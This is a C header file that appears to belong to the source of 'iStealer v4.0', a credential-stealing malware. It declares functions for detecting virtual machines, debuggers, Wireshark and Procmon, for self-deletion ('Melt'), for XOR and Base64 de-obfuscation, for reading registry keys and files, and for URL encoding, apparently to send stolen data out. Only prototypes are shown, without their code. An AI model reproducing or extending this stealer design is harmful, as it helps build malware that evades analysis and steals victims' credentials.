// functions.h - iStealer v4.0 - Kizar Labs 2009
//
//////////////////////////////////////////////////////////////////////

#pragma once
#include <windows.h>
#include <Tlhelp32.h>
#include <stdio.h>

// Prototipos
//
//////////////////////////////////////////////////////////////////////
int InVirtualMachine(void);
int InOllyDbg(void);
int InWireShark(void);
int InProcmon(void);
int Melt(void);
void Base64Decode(int none, char *szInput, char *szOutput);
int ReadFileData(char *filePath, char **buffer, DWORD *bufferSize);
int FileSize(char *filePath);
int ReadKeyData(HKEY hKey, char *subKey, char *value, char *buffer);
unsigned long FindString(char *buffer, unsigned long bufferlen, char *string, unsigned long start);
int GetLine(unsigned long *start, char *buffer, unsigned long bufferlen, char *find, char *output);
char *UnXor(char *string);
char *UnXor2(char *string);
char *UrlEncode(char *string);
